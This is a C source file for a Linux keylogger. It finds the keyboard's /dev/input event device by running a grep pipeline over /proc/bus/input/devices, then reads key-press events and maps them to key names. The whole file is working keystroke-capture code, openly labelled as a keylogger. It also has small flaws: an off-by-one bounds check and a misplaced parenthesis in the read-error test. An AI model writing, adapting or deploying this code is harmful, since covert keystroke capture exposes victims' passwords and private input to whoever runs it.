#include "../include/keylogger.h"

#include "../include/std_include.h"

#define KEY_EVENT_PATH "/dev/input/event0"

#define KEYS_SIZE 112
#define UK "unknown key"

static char *key_map[KEYS_SIZE] = {
    UK, "ESC",
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
    "Backspace", "Tab",
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
    "[", "]", "Enter", "LCtrl",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
    "'", "`", "LShift",
    "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
    "RShift",
    "KP*",
    "LAlt", "SPACE", "CapsLock",
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
    "NumLock", "ScrollLock",
    "KP7", "KP8", "KP9",
    "KP-",
    "KP4", "KP5", "KP6",
    "KP+",
    "KP1", "KP2", "KP3", "KP0",
    "KP.",
    UK, UK, UK,
    "F11", "F12",
    UK, UK, UK, UK, UK, UK, UK,
    "KPEnter", "RCtrl", "KP/", "SysRq", "RAlt", UK,
    "Home", "Up", "PageUp", "Left", "Right", "End", "Down",
    "PageDown", "Insert", "Delete"};

static char *get_keyboard_device_file();

static char *get_keyboard_device_file() {
    static const char *command =
        "grep -E 'Handlers|EV' /proc/bus/input/devices |"
        "grep -B1 120013 |"
        "grep -Eo event[0-9]+ |"
        "tr '\\n' '\\0'";
    FILE *pipe;
    char result[20] = "/dev/input/";
    char temp[9];

    if ((pipe = popen(command, "r")) == NULL) {
        return NULL;
    }

    fgets(temp, 9, pipe);

    pclose(pipe);
    return strdup(strcat(result, temp));
}

ErrorCode keylogger_init(keylogger_t *keylogger) {
    ErrorCode error_code = ERROR_SUCCESS;

    if (keylogger == NULL) {
        error_code = ERROR_INVALID_ARGS;
        goto cleanup;
    }

    if ((keylogger->fd = open(get_keyboard_device_file(), O_RDONLY)) < 0) {
        error_code = ERROR_OPEN;
        goto cleanup;
    }

cleanup:
    if (error_code != ERROR_SUCCESS && keylogger != NULL && keylogger->fd != -1 && close(keylogger->fd) < 0)
        perror("close() fail.");

    return error_code;
}

ErrorCode keylogger_read_key_event(keylogger_t *keylogger, struct input_event *event) {
    ErrorCode error_code = ERROR_SUCCESS;
    ssize_t bytes;

    if (keylogger == NULL || event == NULL) {
        error_code = ERROR_INVALID_ARGS;
        goto cleanup;
    }

    while (1) {
        if ((bytes = read(keylogger->fd, event, sizeof(struct input_event)) < 0)) {
            error_code = ERROR_READ;
            goto cleanup;
        }

        if (event->type == EV_KEY && event->value == 1) {
            break;
        }
    }

cleanup:
    return error_code;
}

char *keylogger_parse_key_event(struct input_event *event) {
    if (event == NULL || event->code > KEYS_SIZE)
        return UK;

    return key_map[event->code];
}

ErrorCode keylogger_destroy(keylogger_t *keylogger) {
    ErrorCode error_code = ERROR_SUCCESS;

    if (keylogger == NULL) {
        error_code = ERROR_INVALID_ARGS;
        goto cleanup;
    }

    if (keylogger->fd != -1 && close(keylogger->fd)) {
        error_code = ERROR_CLOSE;
        goto cleanup;
    }

cleanup:
    return error_code;
}